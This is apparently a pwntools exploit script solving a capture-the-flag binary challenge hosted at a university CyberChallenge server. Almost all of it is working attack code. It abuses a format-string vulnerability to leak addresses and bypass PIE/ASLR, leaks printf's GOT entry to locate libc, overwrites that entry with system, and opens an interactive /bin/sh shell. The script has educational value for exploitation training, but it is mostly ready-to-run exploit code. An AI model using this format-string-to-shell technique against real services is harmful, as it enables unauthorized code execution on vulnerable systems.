from pwn import *

if args["DEBUG"]:
    p = gdb.debug(
        "./bin",
        """
        break main
        continue
        """,
        env={"LD_PRELOAD": "./libc.so.6"}
    )
    
elif args["REMOTE"]:
    p = remote(host="cyberchallenge.disi.unitn.it", port=50230)
else:
    p = process('./bin', env={"LD_PRELOAD": "./libc.so.6"})

context.terminal = ["konsole", "-e"]
p = process('./bin', env={"LD_PRELOAD": "./libc.so.6"})
libc = ELF("./libc.so.6", checksec=False)
elf = context.binary = ELF('./bin', checksec=False)
system_offset = libc.symbols["system"]
printf_offset = libc.symbols["printf"]

# for i in range(30):
#     payload = b'A'* 8 + f"%{i}$p".encode()
#     p.sendlineafter(b'> ', payload)
#     print(p.recvline()) 

##### ASLR BYPASS #####

# leak main address
payload = f"%19$p".encode()
p.sendlineafter(b'> ', payload)
main_address = p.recvline()[:-1]

# calculate PIE offset
PIE_offset = int(main_address, 16) - elf.symbols.main
elf.address = PIE_offset

##### RET2LIBC #####

# leak printf address
printf_got = elf.got["printf"]
fmt_offset = 6

payload = f"%{fmt_offset + 3}$s".encode()
payload += b" " * (24 - len(payload))
payload += p64(printf_got)

p.sendlineafter(b"> ", payload)
printf_address = p.recv(6) + b'\x00\x00'
printf_address = int.from_bytes(printf_address,"little")

libc_base = printf_address - printf_offset
system_address = libc_base + system_offset

system_address = hex(system_address)[9:]

payload = f"%{int(system_address, 16)}c%{fmt_offset + 3}$hn".encode()
payload += b" " * (24 - len(payload))
payload += p64(elf.got["printf"])

p.sendlineafter(b"> ", payload)
p.sendline(b"/bin/sh")
p.clean()
p.interactive()